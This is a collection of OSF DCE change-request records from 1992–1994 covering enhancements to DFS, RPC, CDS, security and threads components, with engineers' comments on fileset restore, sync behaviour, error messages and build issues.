The salvager currently complains when it encounters a read/write fileset that
contains backing anodes, but does nothing to repair the fileset.  It should
at least mark the fileset read-only.
Added field Transarc Deltas with value `' 
Added field Transarc Herder with value `jaffe@transarc.com' 
Added field Transarc Status with value `open'

[10/27/92 public]
Reassign to Blake.  Add Ted to cc list.
Changed Interest List CC from `jdp@transarc.com, comer@transarc.com' to 
 `jdp,comer,ota' 
Changed Responsible Engr. from `ota@transarc.com' to `blake@transarc.com'

[10/19/93 public]
This is just one of many possible improvements to the way the salvager
deals with damage it encounters.
Changed Defect or Enhancement? from `def' to `enh' 
Filled in Reported by Company's Ref. Number with `4514'



CR Number                     : 5692
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : rs6000
S/W Ref Platform              : aix
Component Name                : dfs
Subcomponent Name             : fts restore
Short Description             : fts restore should check target fs for enough space
Reported Date                 : 10/19/92
Found in Baseline             : 1.0.2
Found Date                    : 10/19/92
Severity                      : D
Priority                      : 3
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public
Transarc Status               : open
Transarc Deltas               : 
Transarc Herder               : mcinerny@transarc.com

[10/19/92 public]
It seems fts restore should check the target fileset for enough space to load
the dump file into before it starts restoring the dump file.  It may not seem
like it matters on 48M filesets but on a 1G fs its a big waste of time.

If you're trying to restore a 500M dump file into a 400M fileset fts restore
should inform you that the dump file is larger than the destination fileset
and quit.

    <Note by dstokes (Dawn C. Stokes), 92/08/28 10:03:43, action: note>

The same could be said of fts dump.  Should it check for enough space
before trying to create the dump file??
Added field Transarc Deltas with value `' 
Added field Transarc Herder with value `mason@transarc.com' 
Added field Transarc Status with value `open'

[10/19/92 public]
Assign to Jeff since he is working on dump/restore?

Filled in Interest List CC with `cfe@transarc.com, pakhtar@transarc.com' 
Filled in Responsible Engr. with `jdp' 
Changed Transarc Herder from `mason@transarc.com' to `mcinerny@transarc.com'

[10/19/92 public]
This is definitely an enhancement, not a defect.

In any case, the relationship between the size of a dump and the free space
on a fileset is truly questionable.  This is particularly true when doing
restorations of incremental dumps, where the dump could free more space than
it allocates, or for doing incremental dumps in any form.  There is plenty
of overhead in the dump file format.

Also, the low-level dump/restore stuff does not necessarily read from, or
write to, a file.  Neither the fts dump/restore commands, nor the
FTSERVER_Dump/FTSERVER_Restore RPC interfaces, necessarily have a file that
they can stat() or statfs().

Jeff isn't working on dump/restore.  I believe that this is in the admin
group's arena.
Changed Defect or Enhancement? from `def' to `enh' 
Changed Found in Baseline from `1.0.1' to `1.0.2' 
Changed Fix By Baseline from `1.0.1' to `1.0.2' 
Changed Responsible Engr. from `jdp' to `comer@transarc.com'

[11/2/92 public]
Changed Interest List CC from `cfe@transarc.com, pakhtar@transarc.com' to 
 `cfe@transarc.com, pakhtar@transarc.com, comer@transarc.com' 
Changed Responsible Engr. from `comer@transarc.com' to `vijay@transarc.com'

[11/11/92 public]

Checking the aggregate for lack of space for restoring a fileset does not hold
for incremental restores, as Craig points out. For restoring full dumps,
the overhead in the dump file makes this check non-deterministic. With changes
to the dump file format, it would become impossible to determine if a restore 
from a dump file would fit in the aggregate or not. Some ad-hoc mechanism can 
be used, but would not be a good idea. Also, restores can overwrite existing 
filesets, in which case, the restore may free up space in the aggregate. The
determination of whether the restore would fit in an aggregate should therefore
be left to the administrator.

Changed Severity from `C' to `D' 
Changed Priority from `2' to `3'



CR Number                     : 5681
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : rpc
Subcomponent Name             : 
Short Description             : output argument discipline could be better
Reported Date                 : 10/16/92
Found in Baseline             : 1.0.2b4
Found Date                    : 10/16/92
Severity                      : E
Priority                      : 4
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[10/16/92 public]

RPC API routines (and other components, for that matter, but let's start
with RPC), should be careful with respect to output arguments which are
pointers.

In the event of failure, it would be nice of output pointer arguments were
either set to NULL, or untouched.  Currently, some routines allocate aa
pointer, store it into the output argument, then decide to fail, free the
memory, but don't then clear the output argument to NULL.

If you're being assiduous about memory leaks by including lots of 
if (p) free(p) type statments at the end of routines, this can give you a
rude surprise.



CR Number                     : 5673
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : dfs
Subcomponent Name             : dfsexport
Short Description             : Has un-intuitive command syntax.
Reported Date                 : 10/16/92
Found in Baseline             : 1.0.1
Found Date                    : 10/16/92
Severity                      : C
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public
Transarc Status               : open
Transarc Deltas               : 
Transarc Herder               : mason@transarc.com

[10/16/92 public]

The command syntax for dfsexport allows for a -type specification, indicating
that only aggregates of that type will be exported.  However, this option
must be issued with the -all option to be effective.  Why do you need the 
-all option.  It should be implied from the -type switch.

I used dfsexport with just the -type switch without the -all and it did 
not complain, it just did not export any of the aggregates of that type.

Added field Transarc Deltas with value `' 
Added field Transarc Herder with value `mason@transarc.com' 
Added field Transarc Status with value `open'

[10/16/92 public]
I'm reassigning this to Pervaze, as it's a request for an interface change.
This feature has been around for a long time, and is adequately covered in
the documentation.
Changed Defect or Enhancement? from `def' to `enh' 
Changed Interest List CC from `jeff@transarc.com' to `jeff@transarc.com, 
 cfe@transarc.com' 
Changed Responsible Engr. from `cfe@transarc.com' to `pakhtar@transarc.com'



CR Number                     : 5666
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : rs6000
S/W Ref Platform              : aix
Component Name                : sec
Subcomponent Name             : 
Short Description             : Name collisions between security
headers and system headers
Reported Date                 : 10/15/92
Found in Baseline             : 1.0.1
Found Date                    : 10/15/92
Severity                      : E
Priority                      : 4
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : security/h/macros.h,crypt.h
Sensitivity                   : public

[10/15/92 public]
Some security header files (crypt.h, macros.h, others??) have the same name
as some AIX system headers.  This causes problems in certain build situations.
How about renaming the security headers sec_crypt.h and sec_macros.h?

[10/20/92 public]
How come nobody else has seen problems with name collisions, building on RIOS?
How can you not know what the others are if there are collisions?  I'll look
into changing these 2 for 1.0.2, but will assume these are the only 2
collisions unless you explicitly name others.

[11/2/92 public]
Well you know that there are multiple DCE projects going on within
all the companies -- it doesn't surprise me that build environments,
base platforms, etc may differ...

The "others?" comment was because I didn't do an exhaustive
comparison of the DCE header files with the AIX 3.2+ headers; I 
mentioned the ones that happended to cause problems at the time 
figuring (correctly) that there could be more.  Here are contenders
for current and possible future collisions:

DCE             AIX 3.2.3
macros.h        /usr/include/macros.h
crypt.h         /usr/include/crypt.h
rs.h            /usr/include/sys/rs.h
priv.h          /usr/include/sys/priv.h
acct.h          /usr/include/sys/acct.h

Generically named files always have this collision potential.

[11/17/92 public]
This is not causing build problems on any of the reference platforms, so we
will not be able to address it in 1.0.2.  This is an enhancement request, so
that it will be easier to build the source tree in ways other than the OSF
ships DCE.  We will consider it as part of the post1.0.2 code cleanup, but not
before then.



CR Number                     : 5624
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : rs6000
S/W Ref Platform              : aix
Component Name                : thr
Subcomponent Name             : 
Short Description             : threads functional tests shouldn't build against libcma.a
Reported Date                 : 10/13/92
Found in Baseline             : 1.0.1
Found Date                    : 10/13/92
Severity                      : B
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[10/13/92 public]
Ram Balaraman rediscovered today that at least the threads functional
tests (and perhaps others) are linked against a static libcma.a on the
RIOS, rather than against the shared libdce.a.  This is because a few
symbols originally defined in .s files cannot be used successfully from
libdce.a.  If an application using these symbols is linked against
libdce.a, it will fail in mysterious ways (see OT defects 2631 and
2632).

Though we accepted linking against libcma.a as a workaround for 1.0.1,
it's not acceptable as a permanent fix, for two reasons:  1) disk space
(the statically-linked tests taken about 400KB apiece), and 2)
correctness (the functional tests really should be linked against the
same library as DCE itself uses).

So this defect is a reminder that "we" (probably actually someone at
IBM) need to resolve this for 1.0.2.

[10/19/92 public]

OT cleanup 1 : Severity = unchanged (B)  ;  Priority = unchanged(2)
               Assigned to myself.

N.B. I assigned the bug to myself for the time being. Either IBM or
     I will fix it.

[11/03/92 public]
Changed responsible engr to jd (John Dugas, osf)

[01/18/93 public]
I'm told the problem is that AIX uses an import mechanism for its shared
objects. An import/export file is required for some of the tests and the
threads person in Austin is checking on it.

[02/03/93 public]
The problem here is that at least three of the tests reference 
the symbol cma__transfer_thread_ctx. This is an internal function
that is contained in the assembler module and doesn't get exported
from the shared object libdce.so. The build of these test modules
run into undefined symbol as a result. The remaining test modules
build just fine with libdce. Other executables never reference 
the function directly. We might want to figure out how to link all
but these modules to libdce and link these to libcma or just leave
them the way they are. The makefile LIBS line does the right thing.
The tests themselves pass just fine linked agains libcma.a
I'm going file this as an enhancement to be revisited later.



CR Number                     : 5615
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : dfs
Subcomponent Name             : lfs
Short Description             : asdb - needs a better way of handling aggregate device names.
Reported Date                 : 10/12/92
Found in Baseline             : 1.0.1b24
Found Date                    : 10/12/92
Severity                      : E
Priority                      : 4
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public
Transarc Status               : open
Transarc Deltas               : 
Transarc Herder               : mason@transarc.com

[10/12/92 public]

Asdb assumes that if the aggregate name starts with a "r" it is
specifying the raw device file name - e.g. if there is a device
/dev/rcxa and rcxa is fed to asdb, asdb thinks that rcxa is the raw
device file name instead of rrcxa. A minor problem but confusing
nonetheless.
Added field Transarc Deltas with value `' 
Added field Transarc Herder with value `mason@transarc.com' 
Added field Transarc Status with value `open'



CR Number                     : 5611
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : pmax
S/W Ref Platform              : osf1
Component Name                : sec
Subcomponent Name             : dce-ptgt
Short Description             : dce-ptgt ticket renewal window causes dts synchronization to fail
Reported Date                 : 10/12/92
Found in Baseline             : 1.0.1
Found Date                    : 10/12/92
Severity                      : B
Priority                      : 1
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[10/12/92 public]

DTS gets authentication errors or fails to synchronize if the dtscp
command or the synchronization is attempted as the machine principal
(root) during the renewal of the dce-ptgt ticket.  There appears to
be a window between the time the dce-ptgt ticket expires and the time
it is renewed.  The errors are:

        warning - DTS control program is not authenticated:
                Registry server unavailable (dce / sec)

or

        error executing command:
                must have write permission to the DTS entity (dce / dts)
        warning - DTS control program is not authenticated:
                Cannot find ticket for requested realm (dce / krb)

[10/15/92 public]

OT cleanup 1 : Severity : unchanged (B) ; Priority : (2)

N.B. Severity B implies that this MUST be fixed in the 1.0.2 time frame.

     This bug has been around even in 1.0.1. But this problem
     persists even after the fixes for all the known problems have been
     incorporated (this includes the most recent fix from Wei Hu).

[10/12/93 public]

This problem is caused by the lack of an inter-locking mechanism
between sec_clientd (who is doing the refresh) and the clients.
Since this would require new code to implement, it should be
deferred to 1.1. (per conversation with Bill Sommerfeld)

[10/13/93 public]

Marked as an enhancement because it requires new code to fix and
deferred to 1.1



CR Number                     : 5594
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : rs6000
S/W Ref Platform              : aix
Component Name                : dfs
Subcomponent Name             : bos
Short Description             : Admin lists should be moved to a subdir
Reported Date                 : 10/8/92
Found in Baseline             : 1.0.1
Found Date                    : 10/8/92
Severity                      : D
Priority                      : 4
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public
Transarc Status               : open
Transarc Deltas               : 
Transarc Herder               : mason@transarc.com

[10/8/92 public]
The admin lists should be moved to a seperate subdirectory to make
upclient/upserver administration easier (so you can give a subdir
instead of a list of files).  My suggestion would be to move the
admin lists to /var/dfs/adm, and the logs to a new directory,
/var/dfs/logs.  This is an enhancement, so I am opening it as such.
I have talked to Pervaze about it, and he agrees that it is a 
reasonable idea, but is pretty low on the priority list, so it may
not get done until 1.1.  I added this as the 'Fix By Baseline'
field.
Added field Transarc Deltas with value `' 
Added field Transarc Herder with value `mason@transarc.com' 
Added field Transarc Status with value `open'

[10/9/92 public]
Filled in Interest List CC with `bab@transarc.com'

[11/8/93 public]

[11/17/93 public]

[11/30/93 public]
Are you interested in being able to relocate the admin lists to a separate
directory in your own product or do you want them moved for "the standard
product" (with docs updated, etc)?  If the first, do you want to have the
dynamically relocatable (after reboot) or just be compiled to a different
location.



CR Number                     : 5576
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : dfs
Subcomponent Name             : lfs
Short Description             : need to be able to specify "hyper" fileset ids to epimount.
Reported Date                 : 10/7/92
Found in Baseline             : 1.0.1b24
Found Date                    : 10/7/92
Severity                      : E
Priority                      : 4
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public
Transarc Status               : open
Transarc Deltas               : 
Transarc Herder               : mason@transarc.com

[10/7/92 public]

Currently, epimount cannot accept a "hyper" fileset id. Since fileset
ids are hypers, need a way to parse these hyper fileset ids in epimount.
Suspect that this problem is wider in scope than epimount.
Added field Transarc Deltas with value `' 
Added field Transarc Herder with value `mason@transarc.com' 
Added field Transarc Status with value `open'



CR Number                     : 5563
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : pmax
S/W Ref Platform              : osf1
Component Name                : cds
Subcomponent Name             : 
Short Description             : Change cds create object to return a different error code when
the specified directory does not exist.
Reported Date                 : 10/6/92
Found in Baseline             : 1.0.2
Found Date                    : 10/6/92
Severity                      : C
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[10/6/92 public]

The rpc_ns_xx routines will return entry_not_found when presented
with an entry of the form /.:/dir/entry when either <dir> or
<entry> does not exist in the name space.  We'd like to change
CDS to return different status codes for these 2 cases so that
the NSI can distinguish them for the application.



CR Number                     : 5546
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : rs6000
S/W Ref Platform              : aix
Component Name                : cds
Subcomponent Name             : cdscp
Short Description             : Error messages for local server
ops when cdsd not running.
Reported Date                 : 10/2/92
Found in Baseline             : 1.0.1
Found Date                    : 8/21/92
Severity                      : D
Priority                      : 3
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[10/2/92 public]

When create clearinghouse is attempted with the name of an already
existing clearinghouse, the error message displayed was
Failure in routine: cprrpc_get_binding_handle; code = 382312699
binding incomplete (no object ID and no endpoint) ( dce/rpc)
Failure in routine: cp_create_clh; code = 382312699
binding incomplete (no object ID and no endpoint) (dce/rpc)

Then tried cdscp delete clearinghouse with the same name and got this output.
Failure in routine: cprrpc_get_binding_handle; code = 382312699
binding incomplete (no object ID and no endpoint) ( dce/rpc)
Failure in routine: cp_clrdel_clh; code = 382312699
binding incomplete (no object ID and no endpoint) (dce/rpc)

The messages could have been more meaningful.

[12/7/92 public]
This is an enhancement. The command works when the server is running. Granted
the error message is sub-optimal.

[04/13/93 public]

In a similar vein, 'cdscp create clearinghouse /.:/second_ch' from a
client machine, prints out:

	cdscp create clearinghouse /.:/second_ch Failure in routine:
	cprpc_get_binding_handle; code = 382312699 
	binding incomplete (no object ID and no endpoint) (dce / rpc) 
	Failure in routine: cp_create_clh; code = 382312699    
	binding incomplete (no object ID and no endpoint) (dce / rpc)

I understand that this is not a valid command from a client machine, 
but again, the error message could be more meaningful.



CR Number                     : 5513
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : dfs
Subcomponent Name             : EPISODE
Short Description             : end record does not contain service name
e name
Reported Date                 : 10/1/92
Found in Baseline             : 1.0.2
Found Date                    : 10/1/92
Severity                      : C
Priority                      : 4
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public
Transarc Status               : open
Transarc Deltas               : 
Transarc Herder               : jaffe@transarc.com

[10/1/92 public]
The END record type does not specify either new or old data.  Thus
attempting to put the service name in the end record amounts to a no-op.
However, the ScriptRecord procedure doesn't check any of this and so
prints the lsn as a binary string!  Thus readlog prints garbage and this
useful information is unavailable.
Fixing readlog is a first step.
Adding a new END record type that specifies old (or new) data would be
an added improvement.
Also we noticed that the opHash isn't being put anywhere in the log
records.  This is a very cheap debugging aid that seems to have gotten
lost somewhere along the way.
Further note that the code in EndTran which calls elbl_Write specifies a
length of strlen(opString) but doesn't say "+1" to account for the
terminating null.
Added field Transarc Deltas with value `' 
Added field Transarc Herder with value `jaffe@transarc.com' 
Added field Transarc Status with value `open'

[10/13/92 public]
While we're adding a second end record type with room for the service
name we should also do the same for BEND records.  Currently there is no
provision for including the service name of merged transactions unless
it happens to be the head.  This could be a real inconvenience.
The decision on which type of END (and BEND) record to use should be
made selectable so that we can save space in the log for production
systems.  The opHash, however, should always be available!

[10/19/92 public]
Ted's in mucking with this code anyway; maybe he's fixed it.
Changed Interest List CC from `ota' to `ota,mason' 
Changed Responsible Engr. from `mason@transarc.com' to `ota@transarc.com'

[10/22/92 public]
I've finished mucking, but didn't get to this work.

[9/14/93 public]
Ted believes this should be an enhancement since no harm could be done.
So marked.

[9/14/93 public]
Forgot to change the defect field.
Changed Defect or Enhancement? from `def' to `enh'

[1/24/94 public]
Changed Subcomponent Name from `lfs' to `EPISODE'



CR Number                     : 5502
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : dfs
Subcomponent Name             : EPISODE
Short Description             : salvage report block/frag size on bitmap errors
Reported Date                 : 9/30/92
Found in Baseline             : 1.0.1b24
Found Date                    : 9/30/92
Severity                      : C
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public
Transarc Status               : open
Transarc Deltas               : 
Transarc Herder               : mason@transarc.com

[9/30/92 public]
The bitmap error messages from the salvager are ambiguious without
knowing the block size to fragment size ratio.  This should be printed
at least once if any bitmap errors are encountered.
Added field Transarc Deltas with value `' 
Added field Transarc Herder with value `mason@transarc.com' 
Added field Transarc Status with value `open'

[1/24/94 public]
Changed Subcomponent Name from `lfs' to `EPISODE'



CR Number                     : 5480
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : sec
Subcomponent Name             : sec_rgy_
Short Description             : Certain account ops don't need group/org to be specified
Reported Date                 : 9/28/92
Found in Baseline             : 1.0.1
Found Date                    : 9/28/92
Severity                      : E
Priority                      : 4
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[9/28/92 public]
Operations that act on an existing account need only have the principal
name specified, since only one account per principal is allowed.  The
sec_rgy_acct_delete call already works this way, The following (and any
other call that operates on an existing account) should be enhanced to
work this way (should be allowed to pass in "" for group and org):
sec_rgy_acct_user_replace
sec_rgy_acct_admin_replace
sec_rgy_acct_replace_all
sec_rgy_acct_rename (old_login_name only)
sec_rgy_acct_passwd
sec_rgy_acct_get_projlist
(if we find others that could benefit from behaving this way, we'll add
them to this list).



CR Number                     : 5455
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : other
S/W Ref Platform              : other
Component Name                : cds
Subcomponent Name             : cds/library/dnscfg.c
Short Description             : Incompatibility- Macro with
pthread_cleanup_push causing compile errors.
Reported Date                 : 9/24/92
Found in Baseline             : 1.0.1
Found Date                    : 9/24/92
Severity                      : E
Priority                      : 3
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[9/24/92 public]

Full Description:

        The following definition for CFG_PUSH occurs if _POSIX_THREADS
        is defined:

        #define CFG_PUSH(r,a)     pthread_cleanup_push(r,a)

        When CFG_PUSH is used, the arguments do not match the
        function prototype for pthread_cleanup_push.  That is, they
        don't match the arguments as defined by the POSIX interface
        for pthread_cleanup_push. Compile errors occur when using
        the C/370 compiler to compile this file.

        A similar problem occurs in dnscvtobjid.c and dnsgetattrent.c
        with the macros OBJID_PUSH and ATTR_PUSH respectively.

Repeat By:

        Compile these three files with the C/370 compiler with a
        function prototype for pthread_cleanup_push, matching the
        POSIX interface, included.

Proposed Solution:

        Change the macros by casting the arguments of
        pthread_cleanup_push to the types specified in the POSIX
        interface.  For example,

        #define CFG_PUSH(r,a) \
              pthread_cleanup_push(((void (*)())ra),((void *)a))



CR Number                     : 5437
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : sec
Subcomponent Name             : acl_edit
Short Description             : Unhelpful acl_edit error msg w/non-DCE objects
Reported Date                 : 9/22/92
Found in Baseline             : 1.0.2
Found Date                    : 9/22/92
Severity                      : D
Priority                      : 3
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public
Transarc Deltas               : 
Transarc Herder               : mcinerny@transarc.com
Transarc Status               : open

[9/22/92 public]
It would be nice if acl_edit could give a more useful error message,
like:
	``The file/directory `foo' resides in a filesystem which does
	not support access control lists.''  

instead of what it currently prints:

	acl_edit `pwd`/foo
	ERROR: no identity set yet (dce / sec)
	Unable to bind to object /.../dfs-102-1-51.transarc.com/fs/foo

which leads one to believe that one is not authenticated (which, in
this case, is not the fact).  The only problem here is that .../fs is
in JFS.

Added field Transarc Deltas with value `' 
Added field Transarc Herder with value `mcinerny@transarc.com' 
Added field Transarc Status with value `open'



CR Number                     : 5436
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : sec
Subcomponent Name             : 
Short Description             : sec_login_file_loc.h should not be in export directory
Reported Date                 : 9/22/92
Found in Baseline             : 1.0.1
Found Date                    : 9/22/92
Severity                      : E
Priority                      : 4
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : export/$MACH/usr/include/dce/sec_login_file_loc.h or src/security/h/initstring.h
Sensitivity                   : public

[9/22/92 public]
While compiling a program that had "#include <dce/sec_login_file_loc.h>",
I discovered that it included <initstring.h>. However, initstring.h is
not in the export directory, it is only src/security/h. Either initstring.h
should be in the export directory or sec_login_file_loc.h should not be
in the export directory.

[10/15/92 public]
OT cleanup 1 : Severity : unchanged (E) ; Priority : unchanged (4)

N.B. At this point I felt no change is required in either the priority
     or severity of this bug.

[11/27/92 public]
This is a cleanup item, that should be handled with the rest of the cleanup
CRs (header file names...) which are all enhancements. Made this an enhancement
request.  The file being exported causes *no* problems if you don't include it
and *no* documentation even suggests that you include it anywhere.



CR Number                     : 5426
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : dfs
Subcomponent Name             : EPISODE
Short Description             : sync may not get all the data out in VM systems
Reported Date                 : 9/18/92
Found in Baseline             : 1.0.2
Found Date                    : 9/18/92
Severity                      : C
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public
Transarc Status               : fixed
Transarc Deltas               : blake-db5134-episode-VM-reorg, dimitris-db5134-episode-VM-reorg, et al
Transarc Herder               : jaffe@transarc.com

[9/18/92 public]
sync is implemented by flushing VM, then flushing the buffer system.
However, you may have to flush the buffer system some more when all the
activity created by the VM flush has been completed, because the scheduling
of any page of VM could cause allocation, and the allocation will dirty
one or more buffers.  For instance:  on AIX, vm_writep causes the VMM to
want to write 100 pages.  So one hundred VMM struct buf's get queued on the
strategy daemon's list.  Meanwhile elbb_SyncForce flushes the buffer system.
Some time later page number 100 gets processed by the strategy daemon, which
discovers that a new block must be allocated, which modifies two buffers:  the
buffer representing the indirect block that points to the new block, and the
buffer representing the relevant part of the bitmap.  Both of these buffers
should be scheduled, even though elbb_SyncForce has long since returned.
A consequence of the bug is that if you type ``sync'' and then wait till the
disk quiets down, you cannot be sure that you don't have any more dirty
buffers.
We can't fix this by monitoring the strategy daemon's queue, because
not all the pages flushed by vm_writep will immediately be put on the queue.
If more than 300 pages are flushed, only the first 300 will immediately be
put on the queue; the rest must wait, since the VMM only has 300 struct buf's
for use by Episode.  This is unfortunate, because it means that there is
no obvious way to determine when all the allocation has been done for all
the user data that has been flushed on behalf of a sync.  We can wait for
the quota and/or space reservation to go to zero, but on an active system
this could cause us to wait forever.
A possible fix is, instead of waiting for reservation to go to zero, don't
block, but handle that event when it happens.  That is, if reservation goes
to zero and it has not gone to zero since the last sync, call elbb_SyncForce.
If it doesn't ever go to zero between two calls to sync, the system is active
(the disk never quiets down), so who cares.  And efs_sync itself will call
elbb_SyncForce, ensuring that the data eventually goes out.
Added field Transarc Deltas with value `' 
Added field Transarc Herder with value `jaffe@transarc.com' 
Added field Transarc Status with value `open'

[9/30/92 public]
While it would be nice to give stronger semantic guarantees in
sync(2), this isn't a defect - it is an enhancement.
Changed Defect or Enhancement? from `def' to `enh'

[7/18/94 public]
The problem this bug addresses doesn't exist under the new VM
reorganization done to fix Transarc defect 5134 and related deltas.
Changed Subcomponent Name from `lfs' to `EPISODE' 
Changed Transarc Status from `open' to `fixed' 
Filled in Transarc Deltas with `blake-db5134-episode-VM-reorg, 
 dimitris-db5134-episode-VM-reorg, et al'



CR Number                     : 5417
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 5421,6066
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : dfs
Subcomponent Name             : lfs
Short Description             : sync during panic can hang
Reported Date                 : 9/17/92
Found in Baseline             : 1.0.2
Found Date                    : 9/17/92
Severity                      : C
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public
Transarc Status               : open
Transarc Deltas               : 
Transarc Herder               : jaffe@transarc.com

[9/17/92 public]
On many platform, panic tries to sync all file systems.  Episode's sync code
can get hung up if the panic occurred while some process was holding one of
our many locks.  The solution may require that code executed on behalf of
sync should never wait for a lock.  But we have not thought out the solution
completely yet.

Added field Transarc Deltas with value `' 
Added field Transarc Herder with value `jaffe@transarc.com' 
Added field Transarc Status with value `open'

[9/17/92 public]
This panic sync() call is a problem only because the scheduler won't
run the different threads while processing a panic().  Thus, there's some
state in the system that shuts down multi-threaded processing, and doubtless
lots of parts of the disk processing have to know about it so that I/O isn't
performed by some daemon that will never get scheduled.

One simple solution to the Episode sync()-in-panic() hangup is to have
the wait-for-a-lock procedure check the same are-we-doing-a-panic flag that
these other parts of the kernel are checking.  (An OSI routine like
osi_DoingPanic() suggests itself, with the obvious implementation of
FALSE for unknown platforms.)  Then, just before waiting for some other
process to release a lock, there could be a check for whether the system
is single-threaded inside panic(), and the lock_Obtain call could return
as if it had really been obtained.

Just an idea that would certainly bear scrutiny before trying it out, but
I didn't want to lose it.

[9/17/92 public]
If there were an are-we-doing-a-panic flag on every plaform, it could help us,
but not in the way that Craig suggests.

If sync hits a held lock, it shouldn't just ignore the lock.  The held lock
is a harbinger of inconsistent data structures and should be respected.  But
the flag can tell us whether to wait for a lock, or to give up and not try
to use the locked data.  (It is generally OK, within limits of reason, for
sync to give up on things; for instance, it will generally ignore locked
inodes in inode-based systems.)

[9/18/92 public]
